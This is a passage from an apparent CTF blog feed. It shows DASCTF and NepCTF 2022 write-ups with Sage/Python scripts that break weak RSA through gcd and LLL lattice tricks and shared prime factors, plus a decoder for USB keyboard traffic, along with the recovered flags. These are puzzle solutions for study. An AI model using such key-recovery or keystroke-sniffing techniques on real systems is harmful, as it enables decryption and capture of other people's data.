\cdot Q$，继而求得 $P$ 和 $Q$，又有 $t=(P \cdot(p-58)+q) \bmod Q$，构造格 $\begin{bmatrix} 1 &amp; P \newline 0 &amp; Q \end{bmatrix}$，利用LLL算法规约得到 $p-58$ 和 $q$ 值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">B = <span class="number">1023</span></span><br><span class="line">PPQ = <span class="number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span></span><br><span class="line">PQQ = <span class="number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span></span><br><span class="line">t = <span class="number">44</span></span><br><span class="line">c = <span class="number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">PQ = gcd(PPQ,PQQ)</span><br><span class="line">P = PPQ//PQ</span><br><span class="line">Q = PQQ//PQ</span><br><span class="line"><span class="built_in">print</span>(P)</span><br><span class="line"><span class="built_in">print</span>(Q)</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ,[[<span class="number">1</span>,P],[<span class="number">0</span>,Q]])</span><br><span class="line">x = A.LLL()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = -x+<span class="number">58</span></span><br><span class="line">q = (t-P*(p-<span class="number">58</span>))%Q</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EasyRsa"><a href="#EasyRsa" class="headerlink" title="EasyRsa"></a>EasyRsa</h3><blockquote><p>really easy rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    m = c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c = %s&#x27;</span> % (m)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>gcd测试发现output中的 $n$ 有素公因子 $p$，逆推还原 $m$ 即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n = [<span class="number">65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619</span>,<span class="number">86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499</span>,<span class="number">57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547</span>,<span class="number">52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269</span>,<span class="number">79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243</span>,<span class="number">73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879</span>,<span class="number">89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763</span>,<span class="number">66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643</span>,<span class="number">79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213</span>,<span class="number">70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189</span>,<span class="number">51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663</span>,<span class="number">87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">c = <span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    q = <span class="built_in">int</span>(n[i]//p)</span><br><span class="line">    f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = inverse_mod(e,f)</span><br><span class="line">    c = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n[i]))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(c)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Solomen’s-puzzle-1"><a href="#Solomen’s-puzzle-1" class="headerlink" title="Solomen’s puzzle 1"></a>Solomen’s puzzle 1</h3><blockquote><p>F1ower做梦梦见了Reed和Solomen，他们告诉了F1ower财富密码，但是F1ower记错了几个字节。。请将最终得到的完整flag(包含DASCTF{})进行MD5后再提交，即提交：`”DASCTF</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、杭州安恒信息技术股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。&lt;/p&gt;
&lt;p&gt;大赛以“网络安全为人民、网络安全靠人民”为主题</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2022</title>
    <link href="https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/"/>
    <id>https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/</id>
    <published>2022-07-17T13:18:30.000Z</published>
    <updated>2022-07-17T16:14:32.991Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>“NepCTF 2022”是由Nepnep联合站队主办的公益招新赛事，旨在以有代表性、有特色的题目培养新生网络安全能力。</p><p>比赛时间：2022年7月15日10:00 - 2022年7月17日10:00。</p><p>比赛形式：个人解题赛</p><p>比赛链接：<a href="http://nep.lemonprefect.cn/">http://nep.lemonprefect.cn/</a></p><p>比赛平台：Power by CTFm</p><p>NepCTF 2022赛事说明文档：<a href="https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj">https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj</a></p><p><strong>Rank: 4</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><blockquote><p>极限套娃</p><p>flag格式为nepctf{}</p></blockquote><p>jpg中提取出zip压缩包，zip压缩包套娃232层，用cyberchef label+jump循环提取出最内层的pcap文件；</p><p>wireshark打开发现为USB键盘流量，tshark工具提取出usb.capdata数据，用脚本还原键位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>,</span><br><span class="line"> <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>,</span><br><span class="line">  <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>,</span><br><span class="line"><span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,</span><br><span class="line"><span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,</span><br><span class="line"><span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,</span><br><span class="line"><span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;</span><br><span class="line"><span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>,</span><br><span class="line"><span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>,</span><br><span class="line"> <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>,</span><br><span class="line">  <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>,</span><br><span class="line"><span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>,</span><br><span class="line"><span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>,</span><br><span class="line"> <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,</span><br><span class="line"> <span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line"> <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line"><span class="keyword">del</span> output[a]</span><br><span class="line"><span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span 